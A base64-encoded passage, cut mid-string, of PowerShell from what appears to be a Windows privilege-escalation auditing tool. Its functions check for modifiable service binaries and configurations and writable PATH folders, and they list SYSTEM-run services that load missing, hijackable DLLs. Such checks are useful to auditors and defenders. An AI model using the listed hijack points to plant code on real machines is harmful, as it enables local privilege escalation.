ZpY2VzIHRoYXQgaGF2ZSBhIG1vZGlmaWFibGUgYmluYXJ5IChvciBhcmd1bWVudCkKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIEZJcnN0LCBpdCBlbnVtZXJhdGVzIHRoZSBzZXJ2aWNlcyB0aGFua3MgdG8gdGhlIGN1c3RvbSAiR2V0LVNlcnZpY2VMaXN0IiBmdW5jdGlvbi4gRm9yIGVhY2gKICAgIHJlc3VsdCwgaXQgY2hlY2tzIHRoZSBwZXJtaXNzaW9ucyBvZiB0aGUgSW1hZ2VQYXRoIHNldHRpbmcgdGhhbmtzIHRvIHRoZSAiR2V0LU1vZGlmaWFibGVQYXRoIgogICAgZnVuY3Rpb24uIEVhY2ggcmVzdWx0IGlzIHJldHVybmVkIGluIGEgY3VzdG9tIFBTIG9iamVjdC4gCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtU2VydmljZXNJbWFnZVBlcm1pc3Npb25zQ2hlY2sKCiAgICBOYW1lICAgICAgICAgICAgICA6IFZ1bG5lU2VydmljZQogICAgSW1hZ2VQYXRoICAgICAgICAgOiBDOlxBUFBTXHNlcnZpY2UuZXhlCiAgICBVc2VyICAgICAgICAgICAgICA6IExvY2FsU3lzdGVtCiAgICBNb2RpZmlhYmxlUGF0aCAgICA6IEM6XEFQUFNcc2VydmljZS5leGUKICAgIElkZW50aXR5UmVmZXJlbmNlIDogTlQgQVVUSE9SSVRZXEF1dGhlbnRpY2F0ZWQgVXNlcnMKICAgIFBlcm1pc3Npb25zICAgICAgIDoge0RlbGV0ZSwgV3JpdGVBdHRyaWJ1dGVzLCBTeW5jaHJvbml6ZSwgUmVhZENvbnRyb2wuLi59CiAgICBTdGF0dXMgICAgICAgICAgICA6IFVua25vd24KICAgIFVzZXJDYW5TdGFydCAgICAgIDogRmFsc2UKICAgIFVzZXJDYW5SZXN0YXJ0ICAgIDogRmFsc2UKICAgIAogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQogICAgCiAgICAkU2VydmljZXMgPSBHZXQtU2VydmljZUxpc3QgLUZpbHRlckxldmVsIDEKICAgIFdyaXRlLVZlcmJvc2UgIkVudW1lcmF0aW5nICQoJFNlcnZpY2VzLkNvdW50KSBzZXJ2aWNlcy4uLiIKCiAgICBGb3JFYWNoICgkU2VydmljZSBpbiAkU2VydmljZXMpIHsKCiAgICAgICAgJFNlcnZpY2UuSW1hZ2VQYXRoIHwgR2V0LU1vZGlmaWFibGVQYXRoIHwgV2hlcmUtT2JqZWN0IHskXyAtYW5kICRfLk1vZGlmaWFibGVQYXRoIC1hbmQgKCRfLk1vZGlmaWFibGVQYXRoIC1uZSAnJyl9IHwgRm9yZWFjaC1PYmplY3QgewogICAgICAgICAgICAKICAgICAgICAgICAgJFN0YXR1cyA9ICJVbmtub3duIgogICAgICAgICAgICAjIENhbiB3ZSByZXN0YXJ0IHRoZSBzZXJ2aWNlPwogICAgICAgICAgICAkU2VydmljZVJlc3RhcnQgPSBUZXN0LVNlcnZpY2VEYWNsUGVybWlzc2lvbiAtTmFtZSAkU2VydmljZS5OYW1lIC1QZXJtaXNzaW9uU2V0ICdSZXN0YXJ0JwogICAgICAgICAgICBpZiAoJFNlcnZpY2VSZXN0YXJ0KSB7ICRVc2VyQ2FuUmVzdGFydCA9ICRUcnVlOyAkU3RhdHVzID0gJFNlcnZpY2VSZXN0YXJ0LlN0YXR1cyB9IGVsc2UgeyAkVXNlckNhblJlc3RhcnQgPSAkRmFsc2UgfQogICAgCiAgICAgICAgICAgICMgQ2FuIHdlIHN0YXJ0IHRoZSBzZXJ2aWNlPwogICAgICAgICAgICAkU2VydmljZVN0YXJ0ID0gVGVzdC1TZXJ2aWNlRGFjbFBlcm1pc3Npb24gLU5hbWUgJFNlcnZpY2UuTmFtZSAtUGVybWlzc2lvbnMgJ1N0YXJ0JwogICAgICAgICAgICBpZiAoJFNlcnZpY2VTdGFydCkgeyAkVXNlckNhblN0YXJ0ID0gJFRydWU7ICRTdGF0dXMgPSAkU2VydmljZVN0YXJ0LlN0YXR1cyB9IGVsc2UgeyAkVXNlckNhblN0YXJ0ID0gJEZhbHNlIH0KCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgJFNlcnZpY2UuTmFtZQogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJJbWFnZVBhdGgiIC1WYWx1ZSAkU2VydmljZS5JbWFnZVBhdGgKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVXNlciIgLVZhbHVlICRTZXJ2aWNlLlVzZXIKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTW9kaWZpYWJsZVBhdGgiIC1WYWx1ZSAkXy5Nb2RpZmlhYmxlUGF0aAogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJJZGVudGl0eVJlZmVyZW5jZSIgLVZhbHVlICRfLklkZW50aXR5UmVmZXJlbmNlCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBlcm1pc3Npb25zIiAtVmFsdWUgJF8uUGVybWlzc2lvbnMKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU3RhdHVzIiAtVmFsdWUgJFN0YXR1cwogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VyQ2FuU3RhcnQiIC1WYWx1ZSAkVXNlckNhblN0YXJ0CiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlVzZXJDYW5SZXN0YXJ0IiAtVmFsdWUgJFVzZXJDYW5SZXN0YXJ0CiAgICAgICAgICAgICRTZXJ2aWNlSXRlbQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVNlcnZpY2VzUGVybWlzc2lvbnNDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgRW51bWVyYXRlcyB0aGUgc2VydmljZXMgdGhlIGN1cnJlbnQgY2FuIG1vZGlmeSB0aHJvdWdoIHRoZSBzZXJ2aWNlIG1hbmFnZXIuIEluIGFkZGl0aW9uLCBpdCAKICAgIHNob3dzIHdoZXRoZXIgdGhlIHNlcnZpY2UgY2FuIGJlIHN0YXJ0ZWQvcmVzdGFydGVkLiAKICAgIAogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQoKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgaXMgYmFzZWQgb24gdGhlIG9yaWdpbmFsICJHZXQtTW9kaWZpYWJsZVNlcnZpY2UiIGZyb20gUG93ZXJVcC4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1TZXJ2aWNlc1Blcm1pc3Npb25zQ2hlY2sKICAgIAogICAgTmFtZSAgICAgICAgICAgOiBEVldTCiAgICBJbWFnZVBhdGggICAgICA6IEM6XERWV1NcVnVsbiBTZXJ2aWNlXHNlcnZpY2UuZXhlCiAgICBVc2VyICAgICAgICAgICA6IExvY2FsU3lzdGVtCiAgICBTdGF0dXMgICAgICAgICA6IFN0b3BwZWQKICAgIFVzZXJDYW5TdGFydCAgIDogVHJ1ZQogICAgVXNlckNhblJlc3RhcnQgOiBUcnVlCgogICAgLkxJTksKCiAgICBodHRwczovL2dpdGh1Yi5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L2Jsb2IvbWFzdGVyL1ByaXZlc2MvUG93ZXJVcC5wczEKCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgIyBHZXQtU2VydmljZUxpc3QgcmV0dXJucyBhIGxpc3Qgb2YgY3VzdG9tIFNlcnZpY2Ugb2JqZWN0cyAKICAgICMgVGhlIHByb3BlcnRpZXMgb2YgYSBjdXN0b20gU2VydmljZSBvYmplY3QgYXJlOiBOYW1lLCBEaXNwbGF5TmFtZSwgVXNlciwgSW1hZ2VQYXRoLCBTdGFydE1vZGUsIFR5cGUsIFJlZ3NpdHJ5S2V5LCBSZWdpc3RyeVBhdGggCiAgICAjIFdlIGFsc28gYXBwbHkgdGhlIEZpbHRlckxldmVsIDEgdG8gZmlsdGVyIG91dCBzZXJ2aWNlcyB3aGljaCBoYXZlIGFuIGVtcHR5IEltYWdlUGF0aCAKICAgICRTZXJ2aWNlcyA9IEdldC1TZXJ2aWNlTGlzdCAtRmlsdGVyTGV2ZWwgMQogICAgV3JpdGUtVmVyYm9zZSAiRW51bWVyYXRpbmcgJCgkU2VydmljZXMuQ291bnQpIHNlcnZpY2VzLi4uIgoKICAgICMgRm9yIGVhY2ggY3VzdG9tIFNlcnZpY2Ugb2JqZWN0IGluIHRoZSBsaXN0IAogICAgRm9yRWFjaCAoJFNlcnZpY2UgaW4gJFNlcnZpY2VzKSB7CgogICAgICAgICMgR2V0IGEgJ3JlYWwnIFNlcnZpY2Ugb2JqZWN0IGFuZCB0aGUgYXNzb2NpYXRlZCBEQUNMLCBiYXNlZCBvbiBpdHMgbmFtZSAKICAgICAgICAkVGFyZ2V0U2VydmljZSA9IFRlc3QtU2VydmljZURhY2xQZXJtaXNzaW9uIC1OYW1lICRTZXJ2aWNlLk5hbWUgLVBlcm1pc3Npb25TZXQgJ0NoYW5nZUNvbmZpZycKCiAgICAgICAgaWYgKCRUYXJnZXRTZXJ2aWNlKSB7CgogICAgICAgICAgICAkU2VydmljZVJlc3RhcnQgPSBUZXN0LVNlcnZpY2VEYWNsUGVybWlzc2lvbiAtTmFtZSAkU2VydmljZS5OYW1lIC1QZXJtaXNzaW9uU2V0ICdSZXN0YXJ0JwogICAgICAgICAgICBpZiAoJFNlcnZpY2VSZXN0YXJ0KSB7ICRVc2VyQ2FuUmVzdGFydCA9ICRUcnVlIH0gZWxzZSB7ICRVc2VyQ2FuUmVzdGFydCA9ICRGYWxzZSB9CgogICAgICAgICAgICAkU2VydmljZVN0YXJ0ID0gVGVzdC1TZXJ2aWNlRGFjbFBlcm1pc3Npb24gLU5hbWUgJFNlcnZpY2UuTmFtZSAtUGVybWlzc2lvbnMgJ1N0YXJ0JwogICAgICAgICAgICBpZiAoJFNlcnZpY2VTdGFydCkgeyAkVXNlckNhblN0YXJ0ID0gJFRydWUgfSBlbHNlIHsgJFVzZXJDYW5TdGFydCA9ICRGYWxzZSB9CgogICAgICAgICAgICAkU2VydmljZUl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAgCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkU2VydmljZS5OYW1lIAogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJJbWFnZVBhdGgiIC1WYWx1ZSAkU2VydmljZS5JbWFnZVBhdGggCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlVzZXIiIC1WYWx1ZSAkU2VydmljZS5Vc2VyCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlN0YXR1cyIgLVZhbHVlICRUYXJnZXRTZXJ2aWNlLlN0YXR1cyAKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVXNlckNhblN0YXJ0IiAtVmFsdWUgJFVzZXJDYW5TdGFydAogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VyQ2FuUmVzdGFydCIgLVZhbHVlICRVc2VyQ2FuUmVzdGFydAogICAgICAgICAgICAkU2VydmljZUl0ZW0KICAgICAgICB9CiAgICB9Cn0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgRU5EIFNFUlZJQ0VTICAgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQkVHSU4gRExMIEhJSkFDS0lORyAgIAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZnVuY3Rpb24gSW52b2tlLURsbEhpamFja2luZ0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBDaGVja3Mgd2hldGhlciBhbnkgb2YgdGhlIHN5c3RlbSBwYXRoIGZvbGRlcnMgaXMgbW9kaWZpYWJsZQoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgRmlyc3QsIGl0IHJlYWRzIHRoZSBzeXN0ZW0gZW52aXJvbm1lbnQgUEFUSCBmcm9tIHRoZSByZWdpc3RyeS4gVGhlbiwgZm9yIGVhY2ggZW50cnksIGl0IGNoZWNrcwogICAgd2hldGhlciB0aGUgY3VycmVudCB1c2VyIGhhcyB3cml0ZSBwZXJtaXNzaW9ucy4KCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCiAgICAKICAgICRTeXN0ZW1QYXRoID0gKEdldC1JdGVtUHJvcGVydHkgLVBhdGggIlJlZ2lzdHJ5OjpIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFNlc3Npb24gTWFuYWdlclxFbnZpcm9ubWVudCIgLU5hbWUgIlBhdGgiKS5QYXRoIAogICAgJFBhdGhzID0gJFN5c3RlbVBhdGguU3BsaXQoJzsnKQoKICAgIEZvckVhY2ggKCRQYXRoIGluICRQYXRocykgewogICAgICAgIGlmICgkUGF0aCAtYW5kICRQYXRoIC1uZSAnJykgewogICAgICAgICAgICAkUGF0aCB8IEdldC1Nb2RpZmlhYmxlUGF0aCAtTGl0ZXJhbFBhdGhzIHwgV2hlcmUtT2JqZWN0IHskXyAtYW5kICRfLk1vZGlmaWFibGVQYXRoIC1hbmQgKCRfLk1vZGlmaWFibGVQYXRoIC1uZSAnJyl9IHwgRm9yZWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQYXRoIiAtVmFsdWUgJFBhdGgKICAgICAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTW9kaWZpYWJsZVBhdGgiIC1WYWx1ZSAkXy5Nb2RpZmlhYmxlUGF0aAogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJJZGVudGl0eVJlZmVyZW5jZSIgLVZhbHVlICRfLklkZW50aXR5UmVmZXJlbmNlCiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBlcm1pc3Npb25zIiAtVmFsdWUgJF8uUGVybWlzc2lvbnMKICAgICAgICAgICAgICAgICRJdGVtCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1IaWphY2thYmxlRGxsc0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBMaXN0cyBoaWphY2thYmxlIERMTHMgZGVwZW5kaW5nIG9uIHRoZSB2ZXJzaW9uIG9mIHRoZSBPUwoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgT24gV2luZG93cywgc29tZSBzZXJ2aWNlcyBsb2FkIERMTHMgd2l0aG91dCB1c2luZyBhICJzZWN1cmUiIHNlYXJjaCBwYXRoLiBUaGVyZWZvcmUsIHRoZXkgCiAgICB0cnkgdG8gbG9hZCB0aGVtIGZyb20gdGhlIGZvbGRlcnMgbGlzdGluZyBpbiB0aGUgJVBBVEglIGVudmlyb25tZW50IHZhcmlhYmxlLiBJZiBvbmUgb2YgdGhlc2UKICAgIGZvbGRlcnMgaXMgY29uZmlndXJlZCB3aXRoIHdlYWsgcGVybWlzc2lvbnMsIGEgbG9jYWwgYXR0YWNrZXIgbWF5IHBsYW50IGEgbWFsaWNpb3VzIHZlcnNpb24gb2YKICAgIGEgRExMIGluIG9yZGVyIHRvIGV4ZWN1dGUgYXJiaXRyYXJ5IGNvZGUgaW4gdGhlIGNvbnRleHQgb2YgdGhlIHNlcnZpY2UuCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtSGlqYWNrYWJsZURsbHNDaGVjawoKICAgIE5hbWUgICAgICAgICAgIDogY2Rwc2dzaGltcy5kbGwKICAgIERlc2NyaXB0aW9uICAgIDogTG9hZGVkIGJ5IENEUFN2YyB1cG9uIHNlcnZpY2Ugc3RhcnR1cAogICAgUnVuQXMgICAgICAgICAgOiBOVCBBVVRIT1JJVFlcTE9DQUwgU0VSVklDRQogICAgUmVib290UmVxdWlyZWQgOiBUcnVlCgogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1IaWphY2thYmxlRGxsc0NoZWNrCgogICAgTmFtZSAgICAgICAgICAgOiB3aW5kb3dzcGVyZm9ybWFuY2VyZWNvcmRlcmNvbnRyb2wuZGxsCiAgICBEZXNjcmlwdGlvbiAgICA6IExvYWRlZCBieSBEaWFnVHJhY2sgdXBvbiBzZXJ2aWNlIHN0YXJ0dXAgb3Igc2h1dGRvd24KICAgIFJ1bkFzICAgICAgICAgIDogTlQgQVVUSE9SSVRZXFNZU1RFTQogICAgUmVib290UmVxdWlyZWQgOiBUcnVlCgogICAgTmFtZSAgICAgICAgICAgOiBkaWFndHJhY2tfd2luLmRsbAogICAgRGVzY3JpcHRpb24gICAgOiBMb2FkZWQgYnkgRGlhZ1RyYWNrIHVwb24gc2VydmljZSBzdGFydHVwCiAgICBSdW5BcyAgICAgICAgICA6IE5UIEFVVEhPUklUWVxTWVNURU0KICAgIFJlYm9vdFJlcXVpcmVkIDogVHJ1ZQoKICAgIE5hbWUgICAgICAgICAgIDogd2xic2N0cmwuZGxsCiAgICBEZXNjcmlwdGlvbiAgICA6IExvYWRlZCBieSBJS0VFWFQgdXBvbiBzZXJ2aWNlIHN0YXJ0dXAKICAgIFJ1bkFzICAgICAgICAgIDogTlQgQVVUSE9SSVRZXFNZU1RFTQogICAgUmVib290UmVxdWlyZWQgOiBUcnVlCgogICAgTmFtZSAgICAgICAgICAgOiB3bGFuaGxwLmRsbAogICAgRGVzY3JpcHRpb24gICAgOiBMb2FkZWQgYnkgTmV0TWFuIHdoZW4gbGlzdGluZyBuZXR3b3JrIGludGVyZmFjZXMKICAgIFJ1bkFzICAgICAgICAgIDogTlQgQVVUSE9SSVRZXFNZU1RFTQogICAgUmVib290UmVxdWlyZWQgOiBGYWxzZQoKICAgIC5MSU5LCgogICAgaHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2hhY2tpbmcvY29tbWVudHMvYjBscjA1L2FfZmV3X2JpbmFyeV9wbGF0aW5nXzBkYXlzX2Zvcl93aW5kb3dzLz91dG1fc291cmNlPWFtcCZ1dG1fbWVkaXVtPSZ1dG1fY29udGVudD1wb3N0X3RpdGxlCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICBmdW5jdGlvbiBUZXN0LURsbEV4aXN0cyB7CgogICAgICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtICgKICAgICAgICAgICAgW3N0cmluZ10kTmFtZQogICAgICAgICkKCiAgICAgICAgJFdpbmRvd3NEaXJlY3RvcmllcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgICAgIFt2b2lkXSRXaW5kb3dzRGlyZWN0b3JpZXMuQWRkKCQoSm9pbi1QYXRoIC1QYXRoICRlbnY6d2luZGlyIC1DaGlsZFBhdGggIlN5c3RlbTMyIikpCiAgICAgICAgW3ZvaWRdJFdpbmRvd3NEaXJlY3Rvcmllcy5BZGQoJChKb2luLVBhdGggLVBhdGggJGVudjp3aW5kaXIgLUNoaWxkUGF0aCAiU3lzTmF0aXZlIikpCiAgICAgICAgW3ZvaWRdJFdpbmRvd3NEaXJlY3Rvcmllcy5BZGQoJChKb2luLVBhdGggLVBhdGggJGVudjp3aW5kaXIgLUNoaWxkUGF0aCAiU3lzdGVtIikpCiAgICAgICAgW3ZvaWRdJFdpbmRvd3NEaXJlY3Rvcmllcy5BZGQoJGVudjp3aW5kaXIpCgogICAgICAgIEZvckVhY2ggKCRXaW5kb3dzRGlyZWN0b3J5IGluIFtzdHJpbmdbXV0kV2luZG93c0RpcmVjdG9yaWVzKSB7CiAgICAgICAgICAgICRQYXRoID0gSm9pbi1QYXRoIC1QYXRoICRXaW5kb3dzRGlyZWN0b3J5IC1DaGlsZFBhdGggJE5hbWUgCiAgICAgICAgICAgICROdWxsID0gR2V0LUl0ZW0gLVBhdGggJFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgRXJyb3JHZXRJdGVtIAogICAgICAgICAgICBpZiAoLW5vdCAkRXJyb3JHZXRJdGVtKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJFRydWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJEZhbHNlCiAgICB9CgogICAgZnVuY3Rpb24gVGVzdC1IaWphY2thYmxlRGxsIHsKCiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0gKAogICAgICAgICAgICBbc3RyaW5nXSRTZXJ2aWNlTmFtZSwKICAgICAgICAgICAgW3N0cmluZ10kRGxsTmFtZSwKICAgICAgICAgICAgW3N0cmluZ10kRGVzY3JpcHRpb24sCiAgICAgICAgICAgIFtib29sZWFuXSRSZWJvb3RSZXF1aXJlZCA9ICRUcnVlCiAgICAgICAgKQoKICAgICAgICAkU2VydmljZSA9IEdldC1TZXJ2aWNlRnJvbVJlZ2lzdHJ5IC1OYW1lICRTZXJ2aWNlTmFtZSAKICAgICAgICBpZiAoJFNlcnZpY2UgLWFuZCAoJFNlcnZpY2UuU3RhcnRNb2RlIC1uZSAiRGlzYWJsZWQiKSkgewoKICAgICAgICAgICAgaWYgKC1ub3QgKFRlc3QtRGxsRXhpc3RzIC1OYW1lICREbGxOYW1lKSkgewoKICAgICAgICAgICAgICAgICRIaWphY2thYmxlRGxsSXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkSGlqYWNrYWJsZURsbEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgJERsbE5hbWUKICAgICAgICAgICAgICAgICRIaWphY2thYmxlRGxsSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkRlc2NyaXB0aW9uIiAtVmFsdWUgJERlc2NyaXB0aW9uCiAgICAgICAgICAgICAgICAkSGlqYWNrYWJsZURsbEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJSdW5BcyIgLVZhbHVlICRTZXJ2aWNlLlVzZXIKICAgICAgICAgICAgICAgICRIaWphY2thYmxlRGxsSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlJlYm9vdFJlcXVpcmVkIiAtVmFsdWUgJFJlYm9vdFJlcXVpcmVkIAogICAgICAgICAgICAgICAgJEhpamFja2FibGVEbGxJdGVtCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgJE9zVmVyc2lvbiA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbgoKICAgIGlmICgkT3NWZXJzaW9uLk1ham9yIC1lcSAxMCkgewoKICAgICAgICBUZXN0LUhpamFja2FibGVEbGwgLVNlcnZpY2VOYW1lICJDRFBTdmMiIC1EbGxOYW1lICJjZHBzZ3NoaW1zLmRsbCIgLURlc2NyaXB0aW9uICJMb2FkZWQgYnkgQ0RQU3ZjIHVwb24gc2VydmljZSBzdGFydHVwIgogICAgICAgIFRlc3QtSGlqYWNrYWJsZURsbCAtU2VydmljZU5hbWUgIlNjaGVkdWxlIiAtRGxsTmFtZSAiV3B0c0V4dGVuc2lvbnMuZGxsIiAtRGVzY3JpcHRpb24gIkxvYWRlZCBieSB0aGUgVGFzayBTY2hlZHVsZXIgdXBvbiBzZXJ2aWNlIHN0YXJ0dXAiCgogICAgfQoKICAgICMgV2luZG93cyA3LCA4LCA4LjEKICAgIGlmICgoJE9zVmVyc2lvbi5NYWpvciAtZXEgNikgLWFuZCAoJE9zVmVyc2lvbi5NaW5vciAtZ2UgMSkgLWFuZCAoJE9zVmVyc2lvbi5NaW5vciAtbGUgMykpIHsKCiAgICAgICAgVGVzdC1IaWphY2thYmxlRGxsIC1TZXJ2aWNlTmFtZSAiRGlhZ1RyYWNrIiAtRGxsTmFtZSAid2luZG93c3BlcmZvcm1hbmNlcmVjb3JkZXJjb250cm9sLmRsbCIgLURlc2NyaXB0aW9uICJMb2FkZWQgYnkgRGlhZ1RyYWNrIHVwb24gc2VydmljZSBzdGFydHVwIG9yIHNodXRkb3duIgogICAgICAgIFRlc3QtSGlqYWNrYWJsZURsbCAtU2VydmljZU5hbWUgIkRpYWdUcmFjayIgLURsbE5hbWUgImRpYWd0cmFja193aW4uZGxsIiAtRGVzY3JpcHRpb24gIkxvYWRlZCBieSBEaWFnVHJhY2sgdXBvbiBzZXJ2aWNlIHN0YXJ0dXAiCgogICAgfQoKICAgICMgV2luZG93cyBWaXN0YSwgNywgOAogICAgaWYgKCgkT3NWZXJzaW9uLk1ham9yIC1lcSA2KSAtYW5kICgkT3NWZXJzaW9uLk1pbm9yIC1nZSAwKSAtYW5kICgkT3NWZXJzaW9uLk1pbm9yIC1sZSAyKSkgewoKICAgICAgICAkUmVib290UmVxdWlyZWQgPSAkVHJ1ZQogICAgICAgICRTZXJ2aWNlID0gR2V0LVNlcnZpY2UgLU5hbWUgIklLRUVYVCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgRXJyb3JHZXRTZXJ2aWNlCiAgICAgICAgaWYgKCgtbm90ICRFcnJvckdldFNlcnZpY2UpIC1hbmQgKCRTZXJ2aWNlLlN0YXR1cyAtZXEgIlN0b3BwZWQiKSkgewogICAgICAgICAgICAkUmVib290UmVxdWlyZWQgPSAkRmFsc2UKICAgICAgICB9CgogICAgICAgIFRlc3QtSGlqYWNrYWJsZURsbCAtU2VydmljZU5hbWUgIklLRUVYVCIgLURsbE5hbWUgIndsYnNjdHJsLmRsbCIgLURlc2NyaXB0aW9uICJMb2FkZWQgYnkgSUtFRVhUIHVwb24gc2VydmljZSBzdGFydHVwIiAtUmVib290UmVxdWlyZWQgJFJlYm9vdFJlcXVpcmVkCgogICAgfQoKICAgICMgV2luZG93cyA3CiAgICBpZiAoKCRPc1ZlcnNpb24uTWFqb